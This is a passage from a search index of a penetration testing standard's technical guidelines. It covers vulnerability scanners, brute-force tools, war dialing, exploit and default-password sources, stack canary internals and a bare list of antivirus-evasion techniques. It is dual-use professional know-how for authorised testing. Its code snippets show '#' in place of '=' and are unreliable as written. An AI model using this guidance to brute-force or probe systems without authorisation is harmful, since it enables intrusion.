purposes. Click Export to continue. Choose the file location to save the exported data.","title":"WebInspect (Windows)"},{"location":"pentest_standard/tecguidelines/#ibm-appscan","text":"IBM Rational AppScan automates application security testing by scanning applications, identifying vulnerabilities and generating reports with recommendations to ease remediation. This tutorial will apply to the AppScan Standard Edition which is a desktop solution to automate Web application security testing. It is intended to be use by small security teams with several security testers. To ensure APPScan has the latest updates you should click update on the toolbar menu. This will check the IBM servers for updates. Internet access is required. The simplest way to configure a scan is to use the Configuration Wizard. You can access the Configuration Wizard by clicking \u201cNew\u201d on the File menu. You will be presented with the \u201cNew Scan\u201d dialog box. Enable or disable the \u201cConfiguration Wizard\u201d by checking the box. You can then choose what type of scan you wish to perform. The default is a Web Application Scan. You then have to enter the starting URL for the web application. Other options on that screen include choosing Case-Sensitivity path for Unix\\Linux systems, adding additional servers and domains and enabling proxy and platform authentication option. Uncheck the case-sensitivity path option if you know all the systems are windows as it can help reduce the scan time. If the web application requires authentication then there are several options to choose from. Recorded allows you to record the login procedure so that AppScan can perform the login automatically. Prompt will prompt with the login screen during the scan when a login is required. Automatic can be used in web applications that only require a username and password. An important option is the \u201cI want to configure In-Session detection options\u201d if anything other they \u201cNone\u201d is chosen. This option automatically detects if the web application is out of session. AppScan with automatically configure this feature but if it\u2019s not correct scan results will be unreliable. Next you will be asked to choose a test policy. There are various built-in policies and each have various inclusions and exclusions. You can also create a custom policy. By default AppScan tests the login and logout pages. This is enabled with the \u201cSend tests on login and logout pages\u201d option. Some applications have safeguards that could lockout the test account and prevent a scan from completing. You need monitor the testing logs to ensure login is not failing. AppScan also deletes previous session tokens before testing login pages. You may need to disable this option if a valid session token is required on the login pages. This can disabled by unchecking the \u201cClear session identifiers before testing login pages\u201d option You have now completed the scan configuration and will be prompted to start the scan. By default AppScan will start a full scan of the application. To ensure full coverage of the application a Manual Explore of the application is preferred. With this option AppScan with provide you with a browser window and you can access the application to explore every option and feature available. Once the full application has been explored you can close the browser and AppScan will add the discovered pages its list for testing. You can then start the full scan (Using Scan\uf0e0Full Scan on the menu bar) and AppScan will automatically scan the application.","title":"IBM AppScan"},{"location":"pentest_standard/tecguidelines/#web-directory-listingbruteforcing","text":"DirBuster is a java application that is designed to brute force web directories and files names. DirBuster attempts to find hidden or obfuscated directories, but as with any bruteforcing tool, it is only as good as the directory and file list utilized. For that reason, DirBuster has 9 different lists. [[:File:Penetration_Testing_Execution_117.png|Screenshot Here]]","title":"Web Directory Listing/Bruteforcing"},{"location":"pentest_standard/tecguidelines/#webserver-versionvulnerability-identification","text":"The ability to identify the Webserver version is critical to identify vulnerabilities specific to a particular installation. This information should have been gathered as part of an earlier phase.","title":"Webserver Version/Vulnerability Identification"},{"location":"pentest_standard/tecguidelines/#netsparker-windows","text":"NetSparker is windows based Web Application Scanner. This scanner tests for all common types of web application security flaws. This scanner allows the user to enter NTLM, Forms based and certificate based credentials. NetSparker boasts its ability to confirm the findings it presents to the user. NetSparker is an inexpensive Web Application Scanner. When launching NetSparker, the user is presented with the following screen, which has tabs for the Scan Settings, Authentication and Advanced Settings. NetSparker allows the user to enter credentials for Forms based Authentication in the following dialogue. Once credentials have been entered, NetSparker presents those to the web application in a mini-browser view as seen below. The below confirms that NetSparker is able to use the supplied credentials to login to the application. In an effort to make sure that NetSparker knows when it has logged itself out of the web application, the user is able to specify the logged in and logged out conditions. The final step of the process confirms the settings are configured correctly. NetSparker offers five different methods to start the scan as seen below. These include Start Scan, Crawl and Wait, Manual Crawl (Proxy Mode), Scan Imported Links Only and Schedule Scan. The scan starts with a crawl of the website and classifies the potential security issues as seen below. The next phase is attacking the website. This begins to show identified vulnerabilities as shown in this screenshot. Each finding can be shown in a Browser View as shown in this screenshot. The vulnerability can also be displayed in an HTTP Request / Response format as seen in this screenshot. To check the status of the scan, click on View and select Dashboard. Also included is the Vulnerability Chart Reporting options include PDF, HTML, CSV and XML formats.","title":"NetSparker (Windows)"},{"location":"pentest_standard/tecguidelines/#specialized-vulnerability-scanners","text":"","title":"Specialized Vulnerability Scanners"},{"location":"pentest_standard/tecguidelines/#virtual-private-networking-vpn","text":"Virtual Private Networking (VPN) involves \"tunneling\" private data through the Internet. The four most widely known VPN \"standards\" are Layer 2 Forwarding (L2F), IP Security (IPSec), Point-to-Point Tunneling Protocol (PPTP), and Layer 2 Tunneling Protocol (L2TP). VPN servers generally will not be detected by a port scans as they don't listen on TCP ports, so a TCP port scan won't find them. In addition, they won't normally send ICMP unreachable messages, so a UDP port scans more than likely won't find them. This is why we need specialized scanners to find and identify them. '''ike-scan''' ike-scan is a command-line IPsec VPN scanning, fingerprinting and testing tool that uses the IKE protocol to discover, fingerprint and test IPsec VPN servers. Ike-scan sends properly formatted IKE packet to each of the address you wish to scan and displays the IKE responses that are received. While ike-scan has a dozens of options, we will only cover the basics here. [[:File:Penetration_Testing_Execution_118.png|Screenshot Here]] Using ike-scan to actually perform VPN discovery is relatively straight forward. Simply give it a range and it will attempt to identify [[:File:Penetration_Testing_Execution_119.png|Screenshot Here]]","title":"Virtual Private Networking (VPN)"},{"location":"pentest_standard/tecguidelines/#ipv6","text":"The THC-IPV6 Attack Toolkit is a complete set of tools to scan for inherent protocol weaknesses of IPv6 deployments. Implementation6 which performs various implementation checks on IPv6. [[:File:Penetration_Testing_Execution_120.png|Screenshot Here]] Exploit6 is another tool from the THC-IPV6 Attack Toolkit which can test for known ipv6 vulnerabilities. [[:File:Penetration_Testing_Execution_121.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_122.png|Screenshot Here]]","title":"IPv6"},{"location":"pentest_standard/tecguidelines/#war-dialing","text":"War dialing is process of using a modem to automatically scan a list of telephone numbers, usually dialing every number in a local area code to search for computers, Bulletin board systems and fax machines. '''WarVOX''' WarVOX is a suite of tools for exploring, classifying, and auditing telephone systems. Unlike normal wardialing tools, WarVOX works with the actual audio from each call and does not use a modem directly. This model allows WarVOX to find and classify a wide range of interesting lines, including modems, faxes, voice mail boxes, PBXs, loops, dial tones, IVRs, and forwarders. WarVOX provides the unique ability to classify all telephone lines in a given range, not just those connected to modems, allowing for a comprehensive audit of a telephone system. VoIP VoIP networks rely on the network infrastructure that just simply targeting phones and servers is like leaving half the scope untouched. The intelligence gathering phase should have resulted in identify all network devices, including routers and VPN gateways, web servers, TFTP servers, DNS servers, DHCP servers, RADIUS servers, and firewalls. Note: The default username is admin with a password of warvox. [[:File:Penetration_Testing_Execution_122.png|Screenshot Here]] '''iWar''' iWar is a War dialer written for Linux, FreeBSD, OpenBSD, etc. [[:File:Penetration_Testing_Execution_123.png|Screenshot Here]] '''Plain Analog Wardialer (PAW) / Python Advanced Wardialing System (PAWS)''' PAW / PAWS is a wardialing software in python. It is designed to scan for ISDN (PAWS only) and newer analog modems. [[:File:Penetration_Testing_Execution_124.png|Screenshot Here]] '''SIPSCAN''' SIPSCAN uses REGISTER, OPTIONS and INVITE request methods to scan for live SIP extensions and users. SIPSCAN comes with a list of usernames (users.txt) to brute force. This should be modified to include data collected during earlier phases to target the specific environment. [[:File:Penetration_Testing_Execution_125.png|Screenshot Here]] '''SIPSAK''' SIPSAK is tool that can test for SIP enabled applications and devices using the OPTION request method only. [[:File:Penetration_Testing_Execution_126.png|Screenshot Here]] '''SVMAP''' SVMAP is a part of the SIPVicious suite and it can be used to scan identify and fingerprint a single IP or a range of IP addresses. Svmap allows specifying the method being used such as OPTIONS, INVITE, and REGISTER. [[:File:Penetration_Testing_Execution_127.png|Screenshot Here]]","title":"War Dialing"},{"location":"pentest_standard/tecguidelines/#passive-testing","text":"Passive Testing is exactly what it sounds like. Testing for vulnerabilities but doing so in a passive manner. This is often best left to automated tools, but it can be accomplished by manually methods as well.","title":"Passive Testing"},{"location":"pentest_standard/tecguidelines/#automated-tools_1","text":"","title":"Automated Tools"},{"location":"pentest_standard/tecguidelines/#traffic-monitoring","text":"Traffic Monitoring is a passive mechanism for gathering further information about the targets. This can be helpful in determining the specifics of an operating system or network device. There are times when active fingerprinting may indicate, for example, an older operating system. This may or may not be the case. Passive fingerprinting is essentially a \"free\" way to ensure that the data you are reporting is as accurate as possible. '''P0f''' P0f is an awesome passive fingerprinting tool. P0f can identify the operating system on based upon machines you connect to and that you connect to as well as machines that you cannot connect to. Also, it can fingerprint machines based upon the communications that your interfaces can observe. [[:File:Penetration_Testing_Execution_128.png|Screenshot Here]]","title":"Traffic Monitoring"},{"location":"pentest_standard/tecguidelines/#wireshark","text":"Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues. Wireshark is cross-platform, using the GTK + widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows. [[:File:Penetration_Testing_Execution_129.png|Screenshot Here]]","title":"Wireshark"},{"location":"pentest_standard/tecguidelines/#tcpdump","text":"Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets. There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows. [[:File:Penetration_Testing_Execution_130.png|Screenshot Here]]","title":"Tcpdump"},{"location":"pentest_standard/tecguidelines/#metasploit-scanners","text":"","title":"Metasploit Scanners"},{"location":"pentest_standard/tecguidelines/#metasploit-unleashed","text":"The [ http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning Metasploit Unleashed] course has several tutorials on performing vulnerability scanning leveraging the Metasploit Framework.","title":"Metasploit Unleashed"},{"location":"pentest_standard/tecguidelines/#vulnerability-validation","text":"","title":"Vulnerability Validation"},{"location":"pentest_standard/tecguidelines/#public-research","text":"A product of the vast amount of security research is the discovery of vulnerabilities and associated Proof of Concept (PoC) and/or exploit code. The results from the vulnerability identification phase must be individually validated and where exploits are available, these must be validated. The only exception would be an exploit that results in a Denial of Service (DoS). This would need to be included in the scope to be considered for validation. There are numerous sites that offer such code for download that should be used as part of the Vulnerability Analysis phase. Exploit-db - http://www.exploit-db.com Security Focus - http://www.securityfocus.com Packetstorm - http://www.packetstorm.com Security Reason - http://www.securityreason.com Black Asylum - http://www.blackasylum.com/?p#160","title":"Public Research"},{"location":"pentest_standard/tecguidelines/#commondefault-passwords","text":"Attempt to identify if a device, application, or operating system is vulnerable to a default credential attack is really as simple as trying to enter in known default passwords. Default passwords can be obtained from the following websites: * http://www.phenoelit-us.org/dpl/dpl.html * http://cirt.net/passwords * http://www.defaultpassword.com * http://www.passwordsdatabase.com * http://www.isdpodcast.com/resources/62k-common-passwords/","title":"Common/default passwords"},{"location":"pentest_standard/tecguidelines/#establish-target-list","text":"Identifying all potential targets is critical to penetration testing. Properly established target lists ensure that attacks are properly targeted. If the particular versions of software running in the environment can be identified, the tester is dealing with a known quantity, and can even replicate the environment. A properly defined target list should include a mapping of OS version, patch level information. If known it should include web application weaknesses, lockout thresholds and weak ports for attack.","title":"Establish target list"},{"location":"pentest_standard/tecguidelines/#mapping-versions","text":"Version checking is a quick way to identify application information. To some extent, versions of services can be fingerprinted using nmap, and versions of web applications can often be gathered by looking at the source of an arbitrary page.","title":"Mapping Versions"},{"location":"pentest_standard/tecguidelines/#identifying-patch-levels","text":"To identify the patch level of services internally, consider using software which will interrogate the system for differences between versions. Credentials may be used for this phase of the penetration test, provided the client has acquiesced. Vulnerability scanners are particularly effective at identifying patch levels remotely, without credentials.","title":"Identifying Patch Levels"},{"location":"pentest_standard/tecguidelines/#looking-for-weak-web-applications","text":"Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect.","title":"Looking for Weak Web Applications"},{"location":"pentest_standard/tecguidelines/#identify-weak-ports-and-services","text":"Identifying weak ports can be done using banner grabbing, nmap and common sense. Many ports and services will lie, or mislead about the specifics of their version.","title":"Identify Weak Ports and Services #####"},{"location":"pentest_standard/tecguidelines/#identify-lockout-threshold","text":"Identifying the lockout threshold of an authentication service will allow you to ensure that your bruteforce attacks do not intentionally lock out valid users during your testing. Identify all disparate authentication services in the environment, and test a single, innocuous account for lockout. Often 5 - 10 tries of a valid account is enough to determine if the service will lock users out.","title":"Identify Lockout threshold"},{"location":"pentest_standard/tecguidelines/#attack-avenues","text":"Attack avenues focus on identifying all potential attack vectors that could be leveraged against a target. This is much more detailed than simply looking at the open or filtered ports, but evaluates the Footprinting information and automated results in an effort to create an attack tree.","title":"Attack Avenues"},{"location":"pentest_standard/tecguidelines/#creation-of-attack-trees","text":"Attack trees are conceptual diagrams of threats on target systems and should include all possible attack methods to reach those threats.","title":"Creation of Attack Trees"},{"location":"pentest_standard/tecguidelines/#identify-protection-mechanisms","text":"There is no magic bullet for detecting and subverting Network or Host based protection mechanisms. It takes skill and experience. This is beyond the scope of this document, which only lists the relevant protection mechanisms and describes what they do.","title":"Identify protection mechanisms"},{"location":"pentest_standard/tecguidelines/#network-protections","text":"","title":"Network protections"},{"location":"pentest_standard/tecguidelines/#simple-packet-filters","text":"Packet filters are rules for classifying packets based on their header fields. Packet classification is essential to routers supporting services such as quality of service (QoS), virtual private networks (VPNs), and firewalls.","title":"\"Simple\" Packet Filters"},{"location":"pentest_standard/tecguidelines/#traffic-shaping-devices","text":"Traffic shaping is the control of computer network traffic in order to optimize or guarantee performance, improve latency, and/or increase usable bandwidth for some kinds of packets by delaying other kinds of packets that meet certain criteria. During penetration test traffic shaping can also control the volume of traffic being sent into a network in a specified period, or the maximum rate at which the traffic is sent. For these reasons; traffic shaping is important to detect at the network edges to avoid packet dropping and packet marking.","title":"Traffic shaping devices"},{"location":"pentest_standard/tecguidelines/#data-loss-prevention-dlp-systems","text":"Data Loss Prevention (DLP) refers to systems that identify, monitor, and protect data in use, data in motion, and data at rest via content inspection and contextual analysis of activities (attributes of originator, data object, medium, timing, recipient/destination and so on). DLP systems are analogous to intrusion-prevention system for data.","title":"Data Loss Prevention (DLP) systems"},{"location":"pentest_standard/tecguidelines/#host-based-protections","text":"Host-based protections usually revolve around an installed software package which monitors a single host for suspicious activity by analyzing events occurring within that host. The majority of Host-based protections utilize one of three detection methods: signature-based, statistical anomaly-based and stateful protocol analysis.","title":"Host based protections"},{"location":"pentest_standard/tecguidelines/#stackheap-protections","text":"Numerous tools are available that can monitor the host to provide protections against buffer overflows. Microsoft's Data Execution Prevention mode is an example that is designed to explicitly protect the pointer to the SEH Exception Handler from being overwritten.","title":"Stack/heap protections"},{"location":"pentest_standard/tecguidelines/#whitelisting","text":"Whitelisting provides a list of entities that are being provided a particular privilege, service, mobility, access, or recognition. An emerging approach in combating attacks by viruses and malware is to whitelist software which is considered safe to run, blocking all others","title":"Whitelisting"},{"location":"pentest_standard/tecguidelines/#avfilteringbehavioral-analysis","text":"Behavioral analysis works from a set of rules that define a program as either legitimate, or malicious. Behavioral analysis technology monitors what an application or piece of code does and attempts to restrict its action. Examples of this might include applications trying to write to certain parts of a system registry, or writing to pre-defined folders. These and other actions would be blocked, with the actions notified to the user or administrator.","title":"AV/Filtering/Behavioral Analysis"},{"location":"pentest_standard/tecguidelines/#application-level-protections","text":"","title":"Application level protections"},{"location":"pentest_standard/tecguidelines/#exploitation","text":"","title":"Exploitation"},{"location":"pentest_standard/tecguidelines/#precision-strike","text":"Additional information on exploitation can be found at the [ http://www.offensive-security.com/metasploit-unleashed/Exploit_Development Metasploit Unleashed] course.","title":"Precision strike"},{"location":"pentest_standard/tecguidelines/#countermeasure-bypass","text":"< Contribution Needed >","title":"Countermeasure Bypass"},{"location":"pentest_standard/tecguidelines/#av","text":"< Contribution Needed > * Encoding * Packing * Whitelist Bypass * Process Injection * Purely Memory Resident","title":"AV"},{"location":"pentest_standard/tecguidelines/#human","text":"< Contribution Needed >","title":"Human"},{"location":"pentest_standard/tecguidelines/#hips","text":"< Contribution Needed >","title":"HIPS"},{"location":"pentest_standard/tecguidelines/#dep","text":"< Contribution Needed >","title":"DEP"},{"location":"pentest_standard/tecguidelines/#aslr","text":"< Contribution Needed >","title":"ASLR"},{"location":"pentest_standard/tecguidelines/#va-nx-linux","text":"< Contribution Needed >","title":"VA + NX (Linux)"},{"location":"pentest_standard/tecguidelines/#wx-openbsd","text":"< Contribution Needed >","title":"w^x (OpenBSD)"},{"location":"pentest_standard/tecguidelines/#waf","text":"A WAF (Web application firewall) is a firewall which can be installed in front of (network topology speaking) a web application. The WAF will analyze each request and look for common web attacks such as Cross Site Scripting and SQLinjection. Like most AV scanners, a blacklisting mechanism is often used to find these potentially malicious HTTP requests (often regex). Since these WAFs are using this blacklisting technique, multiple papers exist on bypassing these types of devices.","title":"WAF"},{"location":"pentest_standard/tecguidelines/#stack-canaries","text":"In order to understand the use of the Stack Canaries, one needs to understand the fundamental flaw of buffer overflows. A buffer overflow happens when an application fails to properly verify the length of the input received with the length of the buffer in memory to which this data is copied. Due to the way the stack is build, and the way the data is entered on the stack, the input received could be used to overwrite the EIP (extended instruction pointer, this is used by the application to know where the application came from prior to copying the input to the buffer). When an attacker controls the EIP, the execution of the application can be altered in such a way that the attacker has full control of the application. A potential fix is by adding a \"cookie\" or stack canary right after the buffer on the stack. When the application wants to return, the value of the stack canary is verified. If this value has been altered, the program will ignore the EIP and crash therefore making the buffer overflow ineffective. Every operating system calculates a different cookie.","title":"Stack Canaries"},{"location":"pentest_standard/tecguidelines/#microsoft-windows","text":"The cookie in Windows is added by Visual Studio. One of the options when compiling an application is /GS. The option is enabled by default. The cookie is calculated using a few process specific variables. Below is a representative code of how this cookie is calculated. void generate_security_cookie() { int defaultval1 # 0xFFFF0000; int defaultval2 # 0xBB40E64E; // Hex value of PI without comma... int result # 0; int resultcomp # 0; FILETIME filetimestruct ; GetSystemTimeAsFileTime(&filetimestruct); LARGE_INTEGER perfcounter; QueryPerformanceCounter(&perfcounter); int tickc # GetTickCount(); int threadid # GetCurrentThreadId(); int processid # GetCurrentProcessId(); result # result ^ filetimestruct.dwHighDateTime; result # result ^ filetimestruct.dwLowDateTime; result # result ^ threadid; result # result ^ processid; result # result ^ tickc; result # result ^ perfcounter.HighPart; result # result ^ perfcounter.LowPart; if (result ## defaultval2) { printf(\"Wow, what are they odd of getting the same value as the beginning\"); result # 0xBB40E64E; } else { if (!(result & defaultval1)) { int temp # (result | 0x4711) << 16; result |# temp; } } resultcomp # ~result; As you can see, some of these values are not hard to figure out. Except for maybe the LowDateTime and the performance counter. An excellent paper has been written concerning this lack of entropy. More information can be found in that paper here ([ http://j00ru.vexillium.org/?p#690 Exploiting the otherwise non-exploitable])","title":"Microsoft Windows"},{"location":"pentest_standard/tecguidelines/#linux_1","text":"As in Windows, the somewhat default compiler, gcc, adds the code for the stack canarie. This code can be found in the file libssp/ssp.c static void attribute ((constructor)) __guard_setup (void) { unsigned char *p; int fd; if (__stack_chk_guard !# 0) return; fd # open (\"/dev/urandom\", O_RDONLY); if (fd !# -1) { ssize_t size # read (fd, &__stack_chk_guard, sizeof (__stack_chk_guard)); close (fd); if (size ## sizeof(__stack_chk_guard) && __stack_chk_guard !# 0) return; } /* If a random generator can't be used, the protector switches the guard to the \"terminator canary\". */ p # (unsigned char *) &__stack_chk_guard; p[sizeof(__stack_chk_guard)-1] # 255; p[sizeof(__stack_chk_guard)-2] # '\\n'; p[0] # 0; } It is known that some older versions of gcc do not use the urandom device in order to create a new cookie. They use a preset cookie value (a mix of unprintable characters such as 00 0A 0D and FF). Gcc will compile an application with stack canaries by default. Problems with the implementation on Linux: On a linux machine, there are a few different ways of creating a thread. One of them is called fork(). When using fork to create a new thread, the application will \"quickly\" create a new thread which will reuse the calculated cookie for each new \"fork\"-ed thread. If a buffer overflow would exist in this forked thread, an attacker could bruteforce the stack canarie. Once again a great article describing this attack can be found here ([ http://www.phrack.org/issues.html?issue#67&id#13 Scraps of notes on remote stack overflow exploitation])","title":"Linux"},{"location":"pentest_standard/tecguidelines/#mac-os","text":"Disabled by default. Contribution required.","title":"MAC OS"},{"location":"pentest_standard/tecguidelines/#customized-exploitation","text":"","title":"Customized Exploitation"},{"location":"pentest_standard/tecguidelines/#fuzzing","text":"Fuzzing is the process of attempting to discover security vulnerabilities by sending random input to an application. If the program contains a vulnerability that can leads to an exception, crash or server error (in the case of web apps), it can be determined that a vulnerability has been discovered. Fuzzers are generally good at finding buffer overflow, DoS, SQL Injection, XSS, and Format String bugs. Fuzzing falls into two categories: Dumb Fuzzing and Intelligent Fuzzing.","title":"Fuzzing"},{"location":"pentest_standard/tecguidelines/#dumb-fuzzing","text":"Dumb Fuzzing usually consists of simple modifications to legitimate data, that is then fed to the target application. In this case, the fuzzer is very easy to write and the idea is to identify low hanging fruit. Although not an elegant approach, dumb fuzzing can produce results, especially when a target application has not been previously tested. FileFuzz is an example of a Dumb Fuzzer. FileFuzz is a Windows based file format fuzzing tool that was designed to automate the launching of applications and detection of exceptions caused by fuzzed file formats. [[:File:Penetration_Testing_Execution_131.png|Screenshot Here]]","title":"Dumb Fuzzing"},{"location":"pentest_standard/tecguidelines/#intelligent-fuzzing","text":"Intelligent Fuzzers are ones that are generally aware of the protocol or format of the data being tested. Some protocols require that the fuzzer maintain state information, such as HTTP or SIP. Other protocols will make use of authentication before a vulnerability is identified. Apart from providing much more code coverage, intelligent fuzzers tend to cut down the fuzzing time significantly since they avoid sending data that the target application will not understand. Intelligent fuzzers are therefore much more targeted and sometimes they need to be developed by the security researcher.","title":"Intelligent Fuzzing"},{"location":"pentest_standard/tecguidelines/#sniffing","text":"A packet analyzer is used to intercept and log traffic passing over the network. It is considered best practice to utilize a sniffer when performing exploitation. This ensures that all relevant traffic is captured for further analysis. This is also extremely useful for extracting cleartext passwords.","title":"Sniffing"},{"location":"pentest_standard/tecguidelines/#wireshark_1","text":"Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues. Wireshark is cross-platform, using the GTK + widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows. [[:File:Penetration_Testing_Execution_132.png|Screenshot Here]]","title":"Wireshark"},{"location":"pentest_standard/tecguidelines/#tcpdump_1","text":"Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets. There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows. [[:File:Penetration_Testing_Execution_133.png|Screenshot Here]]","title":"Tcpdump"},{"location":"pentest_standard/tecguidelines/#brute-force","text":"A brute force attack is a strategy that can in theory be used by an attacker who is unable to take advantage of any weakness in a system. It involves systematically checking all possible usernames and passwords until the correct one is found.","title":"Brute-Force"},{"location":"pentest_standard/tecguidelines/#brutus-windows","text":"Brutus is a generic password guessing tool that comes with built-in routines for attacking HTTP Basic and Forms-based authentication, among other protocols like SMTP and POP3. Brutus can perform both ''dictionary ''and randomly generated attacks from a given character set. [[:File:Penetration_Testing_Execution_134.png|Screenshot Here]]","title":"Brutus (Windows)"},{"location":"pentest_standard/tecguidelines/#web-brute-windows","text":"Web Brute is included with HP WebInspect and is the primary means of attacking a login form or authentication page, using prepared lists of user names and passwords. [[:File:Penetration_Testing_Execution_135.png|Screenshot Here]]","title":"Web Brute (Windows)"},{"location":"pentest_standard/tecguidelines/#thc-hydraxhydra","text":"THC-Hydra (or just Hydra) is a network logon bruteforcer which supports attacking many different services such as FTP, HTTP, HTTPS, ICQ, IRC, IMAP, LDAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SAP R/3, SIP, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), TeamSpeak, Telnet, VNC, VMware Auth Daemon, and XMPP. It is available in both a command line and GUI version. [[:File:Penetration_Testing_Execution_136.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_137.png|Screenshot Here]]","title":"THC-Hydra/XHydra"},{"location":"pentest_standard/tecguidelines/#medusa","text":"Medus is another network logon bruteforcer which supports attacking many different services such as AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), Telnet, VNC, and VMware Auth Daemon. It is only available in a command line version. [[:File:Penetration_Testing_Execution_138.png|Screenshot Here]]","title":"Medusa"},{"location":"pentest_standard/tecguidelines/#ncrack","text":"Ncrack is another network logon bruteforcer which supports attacking many different services such as RDP, SSH, http(s), SMB, pop3(s), FTP, and telnet. Ncrack was designed using a modular approach, a command-line syntax similar to Nmap and a dynamic engine that can adapt its behavior based on network feedback. [[:File:Penetration_Testing_Execution_139.png|Screenshot Here]]","title":"Ncrack"},{"location":"pentest_standard/tecguidelines/#routing-protocols","text":"Routing protocols specify how routers communicate with each other, disseminating information that enables them to select routes between any two nodes on a computer network, the choice of the route being done by routing algorithms. Each router has a priori knowledge only of networks attached to it directly. A routing protocol shares this information first among immediate neighbors, and then throughout the network. This way, routers gain knowledge of the topology of the network.","title":"Routing protocols"},{"location":"pentest_standard/tecguidelines/#cisco-discovery-protocol-cdp","text":"The Cisco Discovery Protocol (CDP) is a proprietary Data Link Layer network protocol developed by Cisco Systems that is implemented in most Cisco networking equipment. It is used to share information about other directly connected Cisco equipment, such as the operating system version and IP address. CDP can also be used for On-Demand Routing, which is a method of including routing information in CDP announcements so that dynamic routing protocols do not need to be used in simple networks. Cisco devices send CDP announcements to the multicast destination address 01:00:0C:CC:CC:CC, out each connected network interface. These multicast packets may be received by Cisco switches and other networking devices that support CDP into their connected network interface. This multicast destination is also used in other Cisco protocols such as VTP. By default, CDP announcements are sent every 60 seconds on interfaces that support Subnetwork Access Protocol (SNAP) headers, including Ethernet, Frame Relay, and Asynchronous Transfer Mode (ATM). Each Cisco device that supports CDP stores the information received from other devices in a table that can be viewed using the show cdp neighbors command. This table is also accessible via snmp. The CDP table information is refreshed each time an announcement is received, and the holdtime for that entry is reinitialized. The holdtime specifies the lifetime of an entry in the table - if no announcements are received from a device for a period in excess of the holdtime, the device information is discarded (default 180 seconds). The information contained in CDP announcements varies by the type of device and the version of the operating system running on it. This information may include the operating system version, hostname, every address (i.e. IP address) from all protocol(s) configured on the port where CDP frame is sent, the port identifier from which the announcement was sent, device type and model, duplex setting, VTP domain, native VLAN, power draw (for Power over Ethernet devices), and other device specific information. The details contained in these announcements are easily extended due to the use of the type-length-value (TLV) frame format. The tool for attacking CDP is Yersinia. [[:File:Penetration_Testing_Execution_140.png|Screenshot Here]]","title":"Cisco Discovery Protocol (CDP)"},{"location":"pentest_standard/tecguidelines/#hot-standby-router-protocol-hsrp","text":"Hot Standby Router Protocol (HSRP) is a Cisco proprietary redundancy protocol for establishing a fault-tolerant default gateway, and has been described in detail in RFC 2281. The Virtual Router Redundancy Protocol (VRRP) is a standards-based alternative to HSRP defined in IETF standard RFC 3768. The two technologies are similar in concept, but not compatible. The protocol establishes a framework between network routers in order to achieve default gateway failover if the primary gateway should become inaccessible, in close association with a rapid-converging routing protocol like EIGRP or OSPF. By multicasting packets, HSRP sends its hello messages to the multicast address 224.0.0.2 (all routers) using UDP port 1985, to other HSRP-enabled routers, defining priority between the routers. The primary router with the highest configured priority will act as a virtual router with a pre-defined gateway IP address and will respond to the ARP request from machines connected to the LAN with the MAC address 0000.0c07.acXX where XX is the group ID in hex. If the primary router should fail, the router with the next-highest priority would take over the gateway IP address and answer ARP requests with the same mac address, thus achieving transparent default gateway fail-over. A HSRP Basics Simulation visualizes Active/Standby election and link failover with Hello, Coup, ARP Reply packets, and timers. HSRP and VRRP are not routing protocols as they do not advertise IP routes or affect the routing table in any way. HSRP and VRRP on some routers have the ability to trigger a failover if one or more interfaces on the router go down. This can be useful for dual branch routers each with a single serial link back to the head end. If the serial link of the primary router goes down, you would want the backup router to take over the primary functionality and thus retain connectivity to the head end. The tool for attacking HSRP is Yersinia. [[:File:Penetration_Testing_Execution_141.png|Screenshot Here]]","title":"Hot Standby Router Protocol (HSRP)"},{"location":"pentest_standard/tecguidelines/#virtual-switch-redundancy-protocol-vsrp","text":"The Virtual Switch Redundancy Protocol (VSRP) is a proprietary network resilience protocol developed by Foundry Networks and currently being sold in products manufactured by both Foundry and Hewlett Packard. The protocol differs from many others in use as it combines Layer 2 and Layer 3 resilience - effectively doing the jobs of both Spanning tree protocol and the Virtual Router Redundancy Protocol at the same time. Whilst the restrictions on the physical topologies able to make use of VSRP mean that it is less flexible than STP and VRRP it does significantly improve on the failover times provided by either of those protocols.","title":"Virtual Switch Redundancy Protocol (VSRP)"},{"location":"pentest_standard/tecguidelines/#dynamic-trunking-protocol-dtp","text":"The Dynamic Trunking Protocol (DTP) is a proprietary networking protocol developed by Cisco Systems for the purpose of negotiating trunking on a link between two VLAN-aware switches, and for negotiating the type of trunking encapsulation to be used. It works on the Layer 2 of the OSI model. VLAN trunks formed using DTP may utilize either IEEE 802.1Q or Cisco ISL trunking protocols. DTP should not be confused with VTP, as they serve different purposes. VTP communicates VLAN existence information between switches. DTP aids with trunk port establishment. Neither protocol transmits the data frames that trunks carry. The tool for attacking DTP is Yersinia. [[:File:Penetration_Testing_Execution_142.png|Screenshot Here]]","title":"Dynamic Trunking Protocol 